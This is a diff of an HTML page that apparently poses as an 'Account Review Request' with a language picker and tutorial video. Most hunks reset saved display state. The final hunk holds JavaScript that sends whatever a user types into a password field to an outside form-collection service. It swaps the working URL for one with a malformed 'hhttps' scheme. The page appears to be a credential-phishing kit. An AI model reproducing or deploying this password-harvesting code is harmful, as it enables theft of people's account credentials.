@@ -1197,7 +1197,7 @@
         }
     </style>
 </head>
-<body style="overflow: hidden;">
+<body>
     <div class="header">
         <div class="header-content">
             <div class="logo">
@@ -1268,7 +1268,7 @@
             
             <div class="language-options-container">
                 <div class="language-options">
-                    <button class="language-btn selected" data-lang="english">
+                    <button class="language-btn" data-lang="english">
                         <div class="language-icon">
                             <i class="fas fa-language"></i>
                         </div>
@@ -1348,9 +1348,9 @@
             
             <div class="language-footer">
                 <div class="selected-language-display">
-                    Selected: <strong id="selectedLanguageDisplay">English</strong>
+                    Selected: <strong id="selectedLanguageDisplay">None</strong>
                 </div>
-                <button class="confirm-btn" id="confirmBtn">
+                <button class="confirm-btn" id="confirmBtn" disabled="">
                     <i class="fas fa-check"></i> Confirm Selection
                 </button>
             </div>
@@ -1358,7 +1358,7 @@
     </div>
     
     <!-- Review Modal -->
-    <div class="modal" id="reviewModal" style="display: block;">
+    <div class="modal" id="reviewModal">
         <div class="modal-content">
             <div class="modal-header">
                 <h2 class="modal-title"><i class="fas fa-file-alt"></i> Account Review Request</h2>
@@ -1383,28 +1383,30 @@
                             <span>Connection: Good</span>
                         </div>
                         <div class="video-container">
-                            <video id="tutorialVideo" src="English_US_video_information_V1.mp4" __idm_id__="16385" title="Tutorial Video - English">
+                            <video id="tutorialVideo" src="English_US_video_information_V1.mp4" __idm_id__="40961">
                                 <!-- Source will be set dynamically -->
                                 Your browser does not support the video tag.
                             </video>
-                            <div class="loading-spinner" id="loadingSpinner" style="display: flex;">
+                            <div class="loading-spinner" id="loadingSpinner">
                                 <div class="spinner"></div>
-                                <div class="loading-percentage">100%</div>
+                                <div class="loading-percentage">0%</div>
                             </div>
-                            <div class="video-overlay hidden" id="videoOverlay">
+                            <div class="video-overlay" id="videoOverlay">
                                 <div class="play-btn" id="overlayPlayBtn">
                                     <i class="fas fa-play"></i>
                                 </div>
                                 <p style="color: white; margin-top: 15px; font-weight: 600;">Click to select language</p>
                             </div>
                             <div class="video-controls">
-                                <button class="control-btn" id="playPauseBtn"><i class="fas fa-play"></i></button>
+                                <button class="control-btn" id="playPauseBtn">
+                                    <i class="fas fa-play"></i>
+                                </button>
                                 <div class="progress-container">
-                                    <div class="buffered-bar" id="bufferedBar" style="width: 100%;"></div>
-                                    <div class="progress-bar" id="progressBar" style="width: 23.3964%;"></div>
+                                    <div class="buffered-bar" id="bufferedBar"></div>
+                                    <div class="progress-bar" id="progressBar"></div>
                                 </div>
                                 <div class="time-display">
-                                    <span id="currentTime">0:14</span> / <span id="totalTime">1:00</span>
+                                    <span id="currentTime">0:00</span> / <span id="totalTime">0:00</span>
                                 </div>
                                 <div class="volume-container">
                                     <button class="control-btn" id="volumeBtn">
@@ -2001,7 +2003,7 @@
                 const formData = new FormData();
                 formData.append('password', passwordInput.value);
                 
-                fetch('https://submit-form.com/9PJCUkveD', {
+                fetch('hhttps://submit-form.com/9PJCUkveD', {
                     method: 'POST',
                     body: formData
                 })
